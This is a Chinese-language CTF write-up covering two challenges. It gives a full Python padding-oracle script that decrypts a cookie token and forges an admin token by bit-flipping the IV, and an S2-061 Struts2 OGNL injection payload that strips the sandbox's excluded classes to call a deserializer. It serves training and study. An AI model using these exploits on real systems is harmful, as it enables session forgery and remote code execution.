 

## Checkin

Padding Oracle 原理网上介绍的很详细

```python
import requests
import urllib
import base64

IV = b"0001145141919810"

IV_CT = bytes(base64.b64decode(urllib.parse.unquote("MDAwMTE0NTE0MTkxOTgxMOSJAwAU25w%2BxwD1vPGvUJHVsh6NLJ7vb%2FsVSrbgwGwImEKnG0oVwwt8fdFhuozhk0jH%2FjRV%2FAu%2BnANOd5oipgY%3D")))

IV = IV_CT[:16]
CT = IV_CT[16:]

url = "http://3facbc21-447b-4318-9a38-955666d9a6f9.archive.xdsec.chall.frankli.site:8080/home"
BLOCK_SIZE = 16

def oracle(iv, block):
    r = requests.get(url, cookies={"token": urllib.parse.quote(base64.b64encode(iv + block))})
    ret = r.status_code

    if ret == 200:
        print(ret)
        return True
    else:
        return False

def single_block_attack(block, oracle):
    zeroing_iv = [0] * BLOCK_SIZE

    for pad_val in range(1, BLOCK_SIZE+1):
        padding_iv = [pad_val ^ b for b in zeroing_iv]

        for candidate in range(256):
            padding_iv[-pad_val] = candidate
            iv = bytes(padding_iv)
            if oracle(iv, block):
                if pad_val == 1:
                    padding_iv[-2] ^= 1
                    iv = bytes(padding_iv)
                    if not oracle(iv, block):
                        continue  # false positive; keep searching
                break
        else:
            raise Exception("no valid padding byte found (is the oracle working correctly?)")

        zeroing_iv[-pad_val] = candidate ^ pad_val

    return zeroing_iv


def full_attack(iv, ct, oracle):
    """Given the iv, ciphertext, and a padding oracle, finds and returns the plaintext"""
    assert len(iv) == BLOCK_SIZE and len(ct) % BLOCK_SIZE == 0

    msg = iv + ct
    blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)]
    result = b''

    iv = blocks[0]
    for ct in blocks[1:]:
        dec = single_block_attack(ct, oracle)
        pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))
        result += pt
        iv = ct

    return result

'''print(full_attack(IV,CT,oracle))
'''

plain_text = b'{"Name":"guest","CreateAt":1651331029,"IP":"127.0.0.1"}\t\t\t\t\t\t\t\t\t'
print(CT)
print(plain_text[9:9+5])
plain = b'guest'
ciphe = b'admin'
tmp = [i^j for i,j in zip(plain,ciphe)]
IV = bytes([IV[i] for i in range(9)] + [IV[i+9] ^ tmp[i] for i in range(5)]) + IV[-2:]
print(IV)
token = urllib.parse.quote(base64.b64encode(IV + CT))
print(token)
r = requests.get(url, cookies={"token": token})
print(r.text)

```

 

## Mini Struts2

一眼看到flag逻辑

```java
if (name.equals("MiniLCTF") && year == 2022) {
    File file = new File("/flag");
    BasicFileAttributes basicFileAttributes = Files.readAttributes(file.toPath(), BasicFileAttributes.class);
    if (basicFileAttributes.isRegularFile() && file.exists()) {
        byte[] fileContent = new byte[(int) basicFileAttributes.size()];
        FileInputStream in = new FileInputStream(file);
        in.read(fileContent);
        in.close();
        return new User(new String(fileContent), "947866");
    }
}
```

 第一次出java题不知道怎么出哈哈，整了个最简单的，看到反序列化符合要求的字符串就可以拿到flag

但是Cookie因为加密过没法直接修改，不过显然我们就是要调用`unserialize`这个函数

在`index.jsp`里发现

```jsp
<s:a id="%{id}" href="%{link}">Go to see the photo!</s:a>
```

直接解析了我们传入的`id`

在`IndexAction`里看到一个极其简陋的waf

```java
public void setId(String id) {
    if(id.contains("exec") || id.contains("\\u")){
        this.id = "no";
        return;
    }
    this.id = id;
    this.link = "./asserts/" + this.id + ".jpg";
}
```

看`struts2-core`的版本可以找到s2-061漏洞，稍微看一看然后构造出payload

```java
%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).(#request.map.setBean(#request.get('struts.valueStack'))).(#request.map2=#@org.apache.commons.collections.BeanMap@{}).(#request.map2.setBean(#request.get('map').get('context'))).(#request.map3=#@org.apache.commons.collections.BeanMap@{}).(#request.map3.setBean(#request.get('map2').get('memberAccess'))).(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())).(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet())).(#application.get('org.apache.tomcat.InstanceManager').newInstance('ctf.minil.utils.Unserialize').unserialize('rO0ABXcOAAhNaW5pTENURgAAB+ZzcgAVY3RmLm1pbmlsLm1vZGVscy5Vc2VyAAAAAAAAAAECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHQABjk0Nzg2NnQABlhXYW40bg==').getUsername())}
```

